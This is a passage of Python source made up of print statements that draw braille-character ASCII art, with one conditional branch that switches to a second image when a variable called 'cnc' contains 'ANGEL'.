                print('⣠⣴⣿⠿⠋⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠠⣾⣿⣉⡿⠿⠃⠀⢀⢀⣠⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠈⠾⣋⣈⠉⠉⣻⣿⣿⣿⣟⣾⣳⣟⣷⡻⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⣿⣿⣿⡧')
                print('⠟⠋⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠛⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⢦⣀⡀⢀⣼⠿⡧⢿⠤⡆⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⣿⣻⡽⣾⠻⡟⠀⠀⠀⢺⣷⣴⡖⣆⢻⣿⣿⣿⣿⣿⣿⣷⣟⡾⣵⣻⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿⣿⣿⣿⡃')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣧⣌⠉⠉⠁⠰⢏⡀⣘⣦⠀⠈⠻⣿⣿⣿⣿⢿⣿⣳⢿⣽⣻⣞⡷⠟⠁⣼⠃⠀⠀⠀⠀⠙⣋⣄⢴⡿⢻⣟⠛⣻⣿⣿⣿⣿⣿⣷⣻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟')
                print('⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠻⢦⣄⠀⠀⠓⠁⠀⠀⠀⠀⠀⠙⠿⣏⡀⠙⠻⠟⠚⠋⠉⠀⢀⡴⠃⠀⠀⠀⠀⠀⡠⢽⠅⡰⠁⠀⠹⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧')
                print('⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⢗⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠉⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠳⢤⣄⣀⣀⣠⠴⠋⠁⠀⠀⠀⢀⠤⠪⠊⢀⠜⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⣠⣾⣿⣿⣿⠟⠉⣿⣿⣿⣿⠛⠿⣿⣿⣿⣿⡆')
                print('⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⢀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣦⣄⣀⣀⠉⠙⠲⢦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⡀⠤⠊⠁⠀⠀⡠⠂⠀⠀⠀⠀⠀⢨⡟⢹⣿⣿⣿⣿⣿⣿⣿⣥⣶⣾⣿⣿⡿⠛⠁⠀⠀⠘⢿⣿⣿⣧⠀⠀⠙⢿⣿⣿⣦')
                print('⠀⠀⠀⠀⠀⣻⣿⣿⡿⠀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣀⣠⣾⣿⣶⣤⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡛⠛⠿⠿⠿⠟⠛⠉⢻⡛⠒⣦⡦⣤⣤⣤⣤⣤⣴⡔⠂⠉⠉⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠀⠀⣠⠊⣠⣿⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠶⠂⠙⢿⣿⣿⣦⣤⣀⡀')
                print('⠀⠀⠀⠀⢰⣻⣿⣿⠃⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠙⢦⠙⢷⣄⡀⠀⠈⠻⣿⣿⡄⠀⠀⠀⠀⠀⡰⠁⠀⠀⠀⠀⠀⣠⠞⢁⣴⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⠃')
                print('⠀⠀⠀⠀⣽⣿⣿⡏⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠑⠄⠙⢿⣦⡀⠀⠙⣿⣿⡄⠀⢀⡠⠊⠀⠀⠀⠀⠀⣠⡾⢁⡴⣿⣿⢃⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠔⠒⠂⠻⣿⣿⣷⡄')
                print('⠀⠀⠀⠠⣿⣿⣿⠃⠀⠀⢽⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢩⠻⢿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⣄⡙⠿⣶⣄⠈⢻⣿⣄⠜⠁⠀⠀⠀⠐⣠⡾⠋⡰⠋⣼⣿⠃⢸⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠘⢿⣿⣿⣦⣀⡀')
                print('⠀⠀⠀⠰⣿⣿⣿⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⢸⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣉⠛⢷⣦⣹⣧⣀⡀⠀⣀⣠⠾⠋⢀⠞⠁⢸⣿⡇⠀⣸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⢿⣽')
                print('⠀⠀⠀⠘⣽⣿⣿⡀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⡎⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣳⣦⣌⠙⠛⠿⠿⠿⠛⢁⠀⠰⠋⠀⠀⢾⣿⡆⢀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣟⡾')
                print('⠀⠀⠀⠀⣻⣿⣿⣿⣄⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠈⡇⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢐⡴⠛⠁⠀⠙⣿⡳⠤⡤⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣧⣸⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣽')
                print('⠀⠀⠀⠀⠰⢿⣿⣿⣿⣷⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⡇⠀⠀⠀⠘⣿⣿⣿⡟⠙⢻⣿⣿⣿⣿⣷⣦⣀⡀⠀⢀⣴⠟⠁⠀⠀⢀⣴⠿⠛⠳⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿')
                print('⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⣻⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⢻⡍⠉⠙⠻⢿⣿⣿⣿⡾⠃⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠁⣠⣶⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿')
                print('⠀⠀⠀⠀⠀⠀⠈⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢸⡀⠀⠀⢀⣿⣿⣿⠁⢀⡤⠖⠓⠶⢤⡀⠀⠀⣸⠏⠀⠀⢀⣴⠋⠁⠀⠀⠀⠀⣀⣴⡿⠟⠳⠶⠶⣄⠀⠀⠀⠀⢿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠽⠍⠉⠉⠑⠑⠛⠳⠭⣽⣛⡿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠘⣇⠀⠀⢸⣿⣿⡏⠀⢸⣄⠀⠀⠀⠀⠙⣦⡼⠋⠀⣠⣶⠟⠁⠀⠀⠀⣠⣴⠟⠉⠀⠀⠀⢀⣀⣤⡿⡷⠒⢶⡄⠈⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠣⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿')
                print('⠀⠀⠀⠀⠀⠀⣴⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⡀⠀⣾⣿⡿⠀⠀⠀⠙⢷⣄⢀⣀⣤⣼⢇⡀⣾⡿⠃⠀⠀⢠⣴⡾⠋⢀⣠⠴⠖⠛⠛⠋⠉⠀⠀⠀⠀⠸⣇⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣿⢣⠃⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿')
                print('⠀⠀⠀⠀⡰⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣽⣧⠀⠀⠀⠀⠀⠀⠀⠹⡇⠐⢿⡟⠃⠀⠀⠀⠀⣩⠿⠋⠀⠁⠈⠳⠾⠿⢧⣤⣤⠴⠟⠻⣧⣀⣸⡅⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹')
                print('⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣧⡀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⢰⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠿⠟⠻⣿⡉⢷⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⡄⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⢠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠾⣅⡀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾')
                print('⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠃⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⢻⣮⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⣿⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠘⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣀⠀⠀⠀⠀⠘⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢹⣆⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
                print('⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣵⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⢨⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢧⡀⠀⠀⠀⠀⠀⢻⡛⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⢸⠀')
                print('⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣷⣄⠀⠀⠀⠀⠹⡁⠉⠻⣆⡀⠀⠀⠀⠀⠀⠀⠀⢸⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠴⠂')
                print('⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⡀⠀⠀⠑⢤⡀⠈⠻⣦⣀⠀⠀⠀⠀⠀⠀⢿⡂⠀⠀⠀⠀⢀⣤⠴⠚⠋⢁⣀⣀⣀⠠⡀⠀⠀⠀⠀⠀⠀⢀⡀')
                print('⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢄⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⣦⠀⠀⠀⠙⢦⡀⠈⠙⢷⣄⡀⠀⠀⠀⠀⡇⠀⣀⠴⢚⣩⠤⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈')
                print('⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣎⠳⡀⠀⠀⠈⠻⣆⠀⠀⠈⠻⣦⣄⠀⠀⣇⣊⣵⣾⣯')
                print('⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠘⠀⠀⠀⠀⠈⠳⣄⠀⠀⠈⠻⣷⣶⣻⣿⣻⠝⣿')
                print('⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⡀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠈⠓⢽⡿⣽⣝⡾⠇')
                print('⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀⠈⠻⡳⣄⠀⠀⠀⠈⠃⢯⡛⢧⡀')
                print('⠀⠀⠀⠀⠀⠨⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⠙⢮⣣⡀⠀⠀⠀⠀⠈⠐⠝⢷⣤⡀')
                
        elif "ANGEL" in cnc:       
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠘⢻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣾⡍⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣡⣶⣶⣿⣿⠟⠛⠉⢉⣹⣿⣿⣿⠿⠋⣥⣄⣿⣿⣿⣿⣿⣿⠟⠛⠛⠛⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡾⠟⠛⠉⠁⢠⣦⣴⣾⣶⣿⣿⣿⣋⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⣉⠉⠀⢘⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢉⠀⣤⣶⡶⠾⠿⡿⠛⠉⠉⠁⠶⠿⠿⠀⠀⢸⣿⡿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⣠⣤⣄⠀⢀⣠⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣶⣤⣍⡁⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠯⣤⠀⣼⡿⠏⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⠀⠉⡠⢠⣾⣿⣿⣿⣿⣿⡟⢻⣿⣿⣿⡟⣈⠻⣯⡙⢿⣿⣿⣿⡘⢶⣄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢀⡠⢀⣾⣿⣿⣿⣿⣿⣿⡇⣿⠁⠌⢿⣧⣹⡄⢻⣿⣦⡙⢿⣿⣿⣆⠙⣷⡌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣠⡾⠁⢸⢿⣿⣿⠟⣿⣿⣿⠃⣿⡆⠰⣄⢻⣿⣷⠈⠻⣿⣿⣌⢻⣿⣿⣷⡉⢛⠢⠌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢸⡟⠁⣀⣞⣸⣿⣿⠀⣿⣿⠋⠀⠛⠀⢠⣘⠢⡙⢿⣠⣄⡈⠻⣿⣆⢻⣿⣿⣷⡈⢿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣿⡿⠿⠿⠿⢿⢿⣿⣿⣿⠀⡟⢠⠀⣿⣿⣿⣿⡇⢠⣿⡟⢀⣥⡄⢦⡘⠻⣷⣄⠀⢸⣿⣿⣦⣌⡓⠈⢿⣿⣿⣷⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⢰⣿⣿⣿⣿⣿⣿⣶⡸⣿⠀⣿⣿⢰⣿⣿⣿⣿⣇⠈⠟⣱⣿⣿⣿⣎⠁⢢⣈⠛⣧⠘⡋⠹⠟⠛⠿⠦⢸⣿⣿⣧⣆⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⣿⣮⡻⣿⣿⣿⣿⣿⣿⣞⣿⡄⢹⠇⠘⣿⣿⣿⣿⡿⠀⣴⣿⠟⠃⠈⠉⠀⣼⣿⣿⣶⣤⣥⣤⣶⣶⣦⠄⠀⠙⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
                print(' ⠃⣶⣿⣿⣿⣿⣿⣿⣿⢼⣿⣷⡀⠠⠀⢿⣿⣿⣿⣇⢀⢻⣷⣤⣶⣾⣾⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣯⣀⠀⢸⣿⡟⠃⣸⣿⣿⣿⣿⣿⣿⠿⢟⣟⣛⣛⡿')
                print(' ⢸⣾⡝⢻⣿⣿⣿⣿⣿⢼⣿⣿⣧⡀⠸⡄⢿⣿⣿⣏⠙⢦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣶⠾⠿⢿⣿⣿⣿⣿⠀⣾⡿⠇⣰⣿⣿⣿⣿⣿⣰⣿⣿⣿⣿⢟⣟⣵')
                print(' ⣾⢭⣾⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⣷⢀⠁⠈⢿⣿⣿⣷⡀⢤⣀⣙⣿⣿⣿⡀⠀⠴⠄⠀⠀⣸⣿⣿⣿⠋⠈⣉⠄⡀⠿⣿⣿⣿⣿⢸⣿⣿⣿⣷⣾⣽⢻⣿')
                print(' ⢸⣜⢿⣿⣿⣿⣿⣿⣿⣧⡹⢿⣿⣿⠀⣷⣼⡆⠻⣿⣿⠿⠦⢈⠙⢿⣿⣿⣷⣦⣤⣴⣶⣿⣿⣿⠟⠁⠀⢸⠟⣰⠿⢗⣪⣟⣱⣾⣿⣿⣿⣿⣿⢿⣫⣾⣿')
                print(' ⢿⣿⣿⢊⣙⣿⣿⣿⣿⣿⣿⣷⡮⢃⣼⡿⠟⠀⠀⠹⣿⡗⠀⠀⠀⠀⠛⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀⠀⠀⠈⠠⡿⢀⣿⣿⣿⣿⣿⣿⣿⡟⢵⣿⣿⣿⣿⣿')
                print(' ⢘⣛⣛⣪⣝⢿⣿⣿⣿⣟⠋⠛⠁⠈⠁⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠀⠀⣀⣐⣒⣒⣀⡀⠀⠀⠀⠀⡀⠀⠀⣄⢁⣼⣿⣿⣿⡿⠿⡿⣻⣂⣽⣿⣿⣿⣿⣿')
